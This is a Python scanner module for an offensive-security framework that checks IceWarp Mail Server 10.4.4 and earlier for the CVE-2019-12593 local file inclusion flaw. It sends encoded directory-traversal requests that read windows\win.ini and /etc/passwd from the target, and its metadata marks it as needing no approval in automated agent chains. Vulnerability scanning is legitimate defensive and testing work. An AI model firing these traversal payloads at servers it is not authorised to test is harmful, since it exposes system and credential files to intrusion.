#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IceWarp Mail Server through 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IceWarp Mail Server <=10.4.4 - Local File Inclusion Detection',
        'description': 'IceWarp Mail Server through 10.4.4 is prone to a local file inclusion vulnerability via webmail/calendar/minimizer/index.php?style=..%5c directory traversal.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'packetstorm', 'lfi', 'icewarp', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/JameelNabbo/exploits/blob/master/IceWarp%20%3C%3D10.4.4%20local%20file%20include.txt',
            'http://www.icewarp.com',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-12593',
            'http://packetstormsecurity.com/files/153161/IceWarp-10.4.4-Local-File-Inclusion.html',
        ],
        'cve': 'CVE-2019-12593',
    }

    def run(self):
        for path in ('/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini', '/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('[intl]', 'root:x:0',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='high',
                    reason="IceWarp Mail Server <=10.4.4 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

